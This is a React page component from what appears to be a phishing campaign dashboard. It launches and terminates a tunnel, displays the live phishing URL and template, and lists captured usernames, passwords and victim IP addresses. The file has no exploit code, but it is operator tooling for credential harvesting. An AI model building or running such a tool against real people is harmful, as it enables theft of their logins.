import { AppLayout } from "@/components/layout/AppLayout";
import { useGetCampaign, useStartCampaign, useStopCampaign, useListCaptures, getGetCampaignQueryKey } from "@workspace/api-client-react";
import { useParams } from "wouter";
import { Activity, Copy, Play, Square, ShieldAlert, Globe, Server, Clock } from "lucide-react";
import { copyToClipboard, formatDate } from "@/lib/utils";
import { useToast } from "@/hooks/use-toast";
import { useQueryClient } from "@tanstack/react-query";
import { useState } from "react";

export default function CampaignDetail() {
  const { id } = useParams();
  const campaignId = parseInt(id || "0", 10);
  const { data: campaign, isLoading } = useGetCampaign(campaignId);
  const { data: captures, isLoading: capturesLoading } = useListCaptures({ campaignId });
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});

  const startMutation = useStartCampaign({
    mutation: {
      onSuccess: () => {
        toast({ title: "Session Started", description: "Tunnel is active." });
        queryClient.invalidateQueries({ queryKey: getGetCampaignQueryKey(campaignId) });
      }
    }
  });

  const stopMutation = useStopCampaign({
    mutation: {
      onSuccess: () => {
        toast({ title: "Session Stopped", description: "Tunnel closed successfully." });
        queryClient.invalidateQueries({ queryKey: getGetCampaignQueryKey(campaignId) });
      }
    }
  });

  const handleCopy = (text: string) => {
    copyToClipboard(text);
    toast({ title: "Copied", description: "URL copied to clipboard" });
  };

  if (isLoading) {
    return <AppLayout><div className="p-8 text-muted-foreground">Loading...</div></AppLayout>;
  }

  if (!campaign) {
    return <AppLayout><div className="p-8 text-destructive">Campaign not found.</div></AppLayout>;
  }

  const isActive = campaign.status === 'active';

  return (
    <AppLayout 
      title={campaign.name} 
      description={campaign.description || "No description provided."}
    >
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
        
        {/* Control Panel */}
        <div className="col-span-1 bg-card border border-border rounded-xl p-6 shadow-lg flex flex-col">
          <div className="flex items-center justify-between mb-6">
            <h3 className="font-medium text-muted-foreground uppercase tracking-wider text-xs">Status</h3>
            <div className={`px-3 py-1 text-xs font-bold uppercase rounded-full border ${
              isActive ? 'bg-green-500/10 text-green-400 border-green-500/30 shadow-[0_0_10px_rgba(34,197,94,0.2)]' : 
              'bg-secondary text-muted-foreground border-border'
            }`}>
              <span className={isActive ? "animate-pulse mr-1.5 inline-block w-1.5 h-1.5 bg-green-400 rounded-full" : ""}></span>
              {campaign.status}
            </div>
          </div>

          <div className="flex-1 flex flex-col items-center justify-center py-6 gap-4 border-y border-border/50 my-4">
            {!isActive ? (
              <button
                onClick={() => startMutation.mutate({ id: campaignId })}
                disabled={startMutation.isPending || campaign.status === 'completed'}
                className="w-full flex items-center justify-center gap-2 px-6 py-4 bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground font-bold rounded-xl transition-all shadow-[0_0_15px_rgba(0,255,255,0.1)] hover:shadow-[0_0_20px_rgba(0,255,255,0.4)] disabled:opacity-50"
              >
                <Play className="w-5 h-5 fill-current" />
                {startMutation.isPending ? "Initializing..." : "LAUNCH AUDIT"}
              </button>
            ) : (
              <button
                onClick={() => stopMutation.mutate({ id: campaignId })}
                disabled={stopMutation.isPending}
                className="w-full flex items-center justify-center gap-2 px-6 py-4 bg-destructive/10 text-destructive border border-destructive/30 hover:bg-destructive hover:text-destructive-foreground font-bold rounded-xl transition-all shadow-[0_0_15px_rgba(255,0,0,0.1)] hover:shadow-[0_0_20px_rgba(255,0,0,0.4)] disabled:opacity-50"
              >
                <Square className="w-5 h-5 fill-current" />
                {stopMutation.isPending ? "Terminating..." : "TERMINATE SESSION"}
              </button>
            )}
          </div>

          <div className="space-y-3 text-sm text-muted-foreground mt-2">
            <div className="flex justify-between">
              <span className="flex items-center gap-1.5"><Globe className="w-4 h-4"/> Tunnel</span>
              <span className="font-mono text-foreground">{campaign.tunnelType}</span>
            </div>
            <div className="flex justify-between">
              <span className="flex items-center gap-1.5"><Clock className="w-4 h-4"/> Created</span>
              <span>{formatDate(campaign.createdAt)}</span>
            </div>
          </div>
        </div>

        {/* Info & URL Panel */}
        <div className="col-span-1 lg:col-span-2 bg-card border border-border rounded-xl p-6 shadow-lg">
          <h3 className="font-display font-semibold text-lg mb-6 flex items-center gap-2 text-foreground">
            <Activity className="w-5 h-5 text-primary" /> Active Payload Details
          </h3>

          {isActive && campaign.phishUrl ? (
            <div className="mb-8">
              <label className="block text-xs font-medium text-primary uppercase tracking-wider mb-2">Live Target URL</label>
              <div className="flex items-center gap-2">
                <div className="flex-1 bg-background border border-primary/30 p-3 rounded-lg font-mono text-green-400 text-sm overflow-x-auto whitespace-nowrap shadow-[inset_0_0_10px_rgba(0,255,255,0.05)]">
                  {campaign.phishUrl}
                </div>
                <button 
                  onClick={() => handleCopy(campaign.phishUrl!)}
                  className="p-3 bg-secondary hover:bg-primary/20 hover:text-primary text-muted-foreground border border-border rounded-lg transition-colors"
                  title="Copy URL"
                >
                  <Copy className="w-5 h-5" />
                </button>
              </div>
            </div>
          ) : (
             <div className="mb-8 p-4 border border-dashed border-border/50 rounded-lg text-center text-muted-foreground text-sm">
                Payload URL will appear here once the session is launched.
             </div>
          )}

          <div className="grid grid-cols-2 gap-4">
            <div className="bg-background rounded-lg p-4 border border-border">
              <div className="text-xs text-muted-foreground uppercase mb-1">Template Engine</div>
              <div className="font-medium text-foreground flex items-center gap-2">
                <div className="text-xl">🎣</div> {campaign.templateName}
              </div>
            </div>
            <div className="bg-background rounded-lg p-4 border border-border">
              <div className="text-xs text-muted-foreground uppercase mb-1">Captured Creds</div>
              <div className="font-display text-2xl font-bold text-accent">
                {campaign.captureCount}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Captures Table */}
      <div className="bg-card border border-border rounded-xl overflow-hidden shadow-lg">
        <div className="p-5 border-b border-border flex justify-between items-center bg-secondary/20">
          <h3 className="font-medium text-foreground flex items-center gap-2">
            <ShieldAlert className="w-4 h-4 text-accent" />
            Captured Credentials
          </h3>
          <span className="text-xs text-muted-foreground font-mono bg-background px-2 py-1 rounded border border-border">
            Total: {captures?.length || 0}
          </span>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full text-sm text-left">
            <thead className="text-xs text-muted-foreground uppercase bg-background border-b border-border">
              <tr>
                <th className="px-6 py-3 font-medium">Time</th>
                <th className="px-6 py-3 font-medium">Username</th>
                <th className="px-6 py-3 font-medium">Password</th>
                <th className="px-6 py-3 font-medium">IP Address</th>
              </tr>
            </thead>
            <tbody className="font-mono">
              {capturesLoading ? (
                 <tr><td colSpan={4} className="p-6 text-center text-muted-foreground">Scanning logs...</td></tr>
              ) : captures?.length === 0 ? (
                 <tr><td colSpan={4} className="p-8 text-center text-muted-foreground italic">No data captured yet.</td></tr>
              ) : (
                captures?.map(cap => (
                  <tr key={cap.id} className="border-b border-border/50 hover:bg-secondary/30 transition-colors">
                    <td className="px-6 py-3 text-muted-foreground">{formatDate(cap.capturedAt)}</td>
                    <td className="px-6 py-3 text-cyan-400">{cap.username || '-'}</td>
                    <td className="px-6 py-3 cursor-pointer text-yellow-400/90" onClick={() => setShowPasswords(p => ({...p, [cap.id]: !p[cap.id]}))}>
                      {showPasswords[cap.id] ? cap.password : '••••••••'}
                    </td>
                    <td className="px-6 py-3 text-muted-foreground">{cap.ipAddress || '-'}</td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </AppLayout>
  );
}
